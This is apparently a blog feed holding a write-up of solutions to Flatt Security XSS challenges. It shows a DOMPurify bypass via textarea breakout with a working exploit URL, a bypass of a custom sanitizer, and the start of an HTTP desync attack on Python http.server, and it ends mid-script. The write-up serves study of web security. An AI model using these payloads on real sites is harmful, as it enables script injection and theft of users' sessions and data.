<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-07T15:06:53+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</subtitle><author><name>GitHub User</name><email>your-email@domain.com</email></author><entry><title type="html">Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</title><link href="http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html" rel="alternate" type="text/html" title="Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN" /><published>2024-12-07T00:00:00+00:00</published><updated>2024-12-07T00:00:00+00:00</updated><id>http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions</id><content type="html" xml:base="http://localhost:4000/2024/12/07/flatt-security-xss-challenge-solutions.html"><![CDATA[<p>There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p</p>

<h1 id="challenge-1-by-hamayanhamayan">Challenge 1 by @hamayanhamayan</h1>

<p>This was the most easiest one from the others.</p>

<p>hamayan\src\index.js</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">createDOMPurify</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dompurify</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">JSDOM</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsdom</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nb">window</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JSDOM</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nb">window</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">DOMPurify</span> <span class="o">=</span> <span class="nf">createDOMPurify</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">message</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">message</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="s2">`/?message=Yes%2C%20&lt;b&gt;we%20can&lt;%2Fb&gt;%21`</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span> <span class="c1">// [1]</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">view</span><span class="p">(</span><span class="dl">"</span><span class="s2">/index.ejs</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">sanitized</span><span class="p">:</span> <span class="nx">sanitized</span> <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>On the server side on line [1] , Dompurify was used to sanitize the html from the <code class="language-plaintext highlighter-rouge">message</code> parameter and then the sanitized string from dompurify was passed to the template <code class="language-plaintext highlighter-rouge">index.ejs</code>
We have two injection points here , so the sanitized string is placed at the two places <code class="language-plaintext highlighter-rouge">&lt;%- sanitized %&gt;</code></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">&lt;</span><span class="nx">p</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="o">&gt;&lt;%-</span> <span class="nx">sanitized</span> <span class="o">%&gt;&lt;</span><span class="sr">/b&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span> <span class="nx">action</span><span class="o">=</span><span class="dl">""</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="o">&gt;&lt;%-</span> <span class="nx">sanitized</span> <span class="o">%&gt;&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span></code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/3958697d-c279-4d2c-a99e-7e9167393fad" alt="image" /></p>

<p>Well Dompurify latest version is used so a direct bypass isn’t possible, let’s focus on the second insertion point which is inside <code class="language-plaintext highlighter-rouge">template</code> element. As in the first one there is no chance.
By default, the  <code class="language-plaintext highlighter-rouge">template</code> element’s content is not rendered, as we can see in the screenshot the injected html appears as it is ,not rendered as html.</p>

<p>Dompurify isn’t aware of the context where the sanitized data will be in use i.e <code class="language-plaintext highlighter-rouge">template</code> element in our case. So it’s possible to get xss here even though state of the art DOMPurify is in use.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>shirley<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>https://yeswehack.github.io/Dom-Explorer/dom-explore , as can be seen the above payload is consider safe by dompurify as the string <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;</code> is inside the attribute value.
<img src="https://github.com/user-attachments/assets/c361ba80-4406-4db9-93e8-aef00f9d3c20" alt="image" /></p>

<p>Things gets interesting when the same payload is used in context like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"message"</span><span class="nt">&gt;</span> <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>shirley<span class="nt">&lt;/a&gt;</span> <span class="nt">&lt;/textarea&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/b316663f-778e-4928-bfe5-4911cab5d53c" alt="image" /></p>

<p>When this is parsed by the browser , as earlier mentioned the content inside of <code class="language-plaintext highlighter-rouge">textarea</code> element doesn’t gets rendered so as soon as the  <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;</code> is seen by the browser it will close the <code class="language-plaintext highlighter-rouge">textarea</code> context right there. And rest of the part is no longer inside <code class="language-plaintext highlighter-rouge">textarea</code> so it gets render now as HTML. Thus giving us an xss vector <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code></p>

<p>https://challenge-hamayan.quiz.flatt.training/?message=%3Ca%20id=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert()%3E%22%3E
<img src="https://github.com/user-attachments/assets/0d44738c-eeb3-42e9-ab26-fb970df57120" alt="image" /></p>

<hr />

<h1 id="challenge-2-by-ryotkak">Challenge 2 by @ryotkak</h1>

<p>A very interesting challenge indeed</p>

<p>http://34.171.202.118/</p>

<p>This application allows you to  create drafts, but no html is allowed. On the server side it html encodes the input. Although the html encoded input goes through a custom xss sanitizer on the client side and then used in <code class="language-plaintext highlighter-rouge">innerHTML</code> but it passes html encoded version <code class="language-plaintext highlighter-rouge">&amp;lt; &amp;gt;</code> it looks useless so it suggest that there might be another vuln:</p>

<p><img src="https://github.com/user-attachments/assets/ca96cba1-4baf-4f76-bac1-96eff6121259" alt="image" /></p>

<p>When we create a draft, it provides us with an id in the url like this http://34.171.202.118/?draft_id=fbca1697-5c42-41a9-abdc-3628bdb5f054 when this page is load the following things happen in the background</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="dl">'</span><span class="s1">draft_id</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/drafts?id=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">draft_id</span><span class="dl">'</span><span class="p">))}</span><span class="s2">`</span><span class="p">);</span>
                <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">();</span>
                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">content</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
                <span class="nf">previewContent</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>It takes the <code class="language-plaintext highlighter-rouge">draft_id</code> parameter value and use it in a fetch call to the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> endpoint. The value of the id is url encoded. The response from this endpoint is then passed to a custom sanitizer, the sanitized output is then passed to the sink <code class="language-plaintext highlighter-rouge">innerHTML</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">function</span> <span class="nf">previewContent</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">preview</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nf">sanitizeHtml</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span> <span class="c1">// just in case</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>The response return from the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> is going to be html encoded so it’s clear that the goal of this challenge is to find a way to make the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> endpoint return our payload which is not html encoded and find a bypass for the Sanitizer then.</p>

<p>To get a start let’s try to find a bypass for the sanitizer first, it’s not dompurify so it shouldn’t give much trouble to us:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">const</span> <span class="nx">SANITIZER_CONFIG</span> <span class="o">=</span> <span class="p">{</span>
            <span class="na">DANGEROUS_TAGS</span><span class="p">:</span> <span class="p">[</span>
                <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">style</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">embed</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">meta</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">link</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">base</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">frame</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">frameset</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">svg</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">math</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">template</span><span class="dl">'</span><span class="p">,</span>
            <span class="p">],</span>

            <span class="na">ALLOW_ATTRIBUTES</span><span class="p">:</span> <span class="kc">false</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">sanitizeHtml</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">doc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DOMParser</span><span class="p">().</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">nodeIterator</span> <span class="o">=</span> <span class="nx">doc</span><span class="p">.</span><span class="nf">createNodeIterator</span><span class="p">(</span><span class="nx">doc</span><span class="p">,</span> <span class="nx">NodeFilter</span><span class="p">.</span><span class="nx">SHOW_ELEMENT</span><span class="p">);</span>

            <span class="k">while </span><span class="p">(</span><span class="nx">nodeIterator</span><span class="p">.</span><span class="nf">nextNode</span><span class="p">())</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">currentNode</span> <span class="o">=</span> <span class="nx">nodeIterator</span><span class="p">.</span><span class="nx">referenceNode</span><span class="p">;</span>
                <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span> <span class="k">instanceof</span> <span class="nx">NamedNodeMap</span><span class="p">)</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">remove</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">removeAttribute</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nf">warn</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOM Clobbering detected!</span><span class="dl">"</span><span class="p">);</span>
                    <span class="k">return</span> <span class="dl">""</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">SANITIZER_CONFIG</span><span class="p">.</span><span class="nx">DANGEROUS_TAGS</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()))</span> <span class="p">{</span>
                    <span class="nx">currentNode</span><span class="p">.</span><span class="nf">remove</span><span class="p">();</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">SANITIZER_CONFIG</span><span class="p">.</span><span class="nx">ALLOW_ATTRIBUTES</span> <span class="o">&amp;&amp;</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">attribute</span> <span class="k">of</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">currentNode</span><span class="p">.</span><span class="nf">removeAttribute</span><span class="p">(</span><span class="nx">attribute</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>From the <code class="language-plaintext highlighter-rouge">SANITIZER_CONFIG</code> you can see, it has list of elements which it regards as dangerous and <code class="language-plaintext highlighter-rouge">ALLOW_ATTRIBUTES</code> key is set to false which might indicate that we can’t have any attributes and the elements listed in the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> in our html.</p>

<p>The dirty string passed to <code class="language-plaintext highlighter-rouge">sanitizeHtml</code> , is first used to create a DOM Tree using the <code class="language-plaintext highlighter-rouge">DOMParser</code> and then it iterates over each node , first checks for the nodeName property which basically returns element name and checks if it’s in the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> array or not if it’s there it removes the node completely (means it’s child will also be removed)
The second check is for the attributes , as <code class="language-plaintext highlighter-rouge">ALLOW_ATTRIBUTES</code> is set to false it should remove all the attributes.</p>

<p>This the minimal structure of how a sanitizer is actually implemented, if you look at DOMPurify inner working it also creates a DOM Tree first then iterates and remove the dangerous stuffs.</p>

<p>In the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> list I saw that <code class="language-plaintext highlighter-rouge">textarea</code> isn’t there, so I thought that might be helpful.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sanitizeHtml</span><span class="p">(</span><span class="s2">`&lt;textarea&gt;&lt;a id="&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"&gt;&lt;/textarea&gt;`</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">&lt;textarea&gt;&amp;lt;a id="&lt;/textarea&gt;&lt;img onerror="alert()"&gt;"&amp;gt;
</span></code></pre></div></div>
<p>We can see with this vector , the <code class="language-plaintext highlighter-rouge">onerror</code> attribute remained there which was weird. As I assumed this would take care of all the attributes. I did setup breakpoint to understand where the magic happens but still couldn’t get. It seems it just ignores iterating over that specific element.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">attribute</span> <span class="k">of</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">currentNode</span><span class="p">.</span><span class="nf">removeAttribute</span><span class="p">(</span><span class="nx">attribute</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
                    <span class="p">}</span>
</code></pre></div></div>

<p>So this was the payload which I thought was intented, required user interaction but ok atleast we have something :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea&gt;&lt;a</span><span class="err">/</span><span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;text/src='x'onmouseover='alert()'&gt;shirley"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Moving on the server side code</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="n">protocol_version</span> <span class="o">=</span> <span class="sh">'</span><span class="s">HTTP/1.1</span><span class="sh">'</span>
    <span class="n">content_type_text</span> <span class="o">=</span> <span class="sh">'</span><span class="s">text/plain; charset=utf-8</span><span class="sh">'</span>
    <span class="n">content_type_html</span> <span class="o">=</span> <span class="sh">'</span><span class="s">text/html; charset=utf-8</span><span class="sh">'</span>

    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">parsed_path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">parsed_path</span><span class="p">.</span><span class="n">path</span>
        <span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">parse_qs</span><span class="p">(</span><span class="n">parsed_path</span><span class="p">.</span><span class="n">query</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Cache-Control</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">max-age=3600</span><span class="sh">'</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_html</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">index_html</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">elif</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/api/drafts</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">draft_id</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">''</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">draft_id</span> <span class="ow">in</span> <span class="n">drafts</span><span class="p">:</span>
                <span class="n">escaped</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="nf">escape</span><span class="p">(</span><span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">])</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">escaped</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">Path %s not found</span><span class="sh">'</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Post is too large</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
        <span class="n">draft_id</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">uuid4</span><span class="p">())</span>
        <span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">draft_id</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">content_type</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">,</span> <span class="n">content_type</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Connection</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">keep-alive</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
</code></pre></div></div>

<p>The routing for 404 pages looked interesting as it was reflecting the path as it is without any sanitization even though the <code class="language-plaintext highlighter-rouge">Content-Type</code> for this endpoint is <code class="language-plaintext highlighter-rouge">text/plain</code> it can still be usefull if we can find a way to serve a 404 response instead for the original /api/drafts?id= request.</p>

<p>The <code class="language-plaintext highlighter-rouge">Content-Length</code> request header check looked kinda sus , when we are dealing Python the first thing which comes into my mind is Desync attacks (thanks to @kevin_mizu for his work on this area )</p>

<p>This challenge turned out to be a very similar one as this https://mizu.re/post/twisty-python</p>

<p>The problem , the application checks the <code class="language-plaintext highlighter-rouge">Content-Length</code> to make sure it’s not more than 100. If it’s more than 100 it sends a 413 status code and calls <code class="language-plaintext highlighter-rouge">send_data</code> method which sends back the response. But the connection is never close?</p>

<p>From Mizu’s blogpost <em>So, if the application doesn’t read the body, and the connection isn’t closed (keep-alive), by default http.server will ignore the Content-Length header and interpret the request body as part of the subsequent request.</em></p>

<p>Let’s try the theory</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span> <span class="na">target=</span><span class="s">"shirley"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>
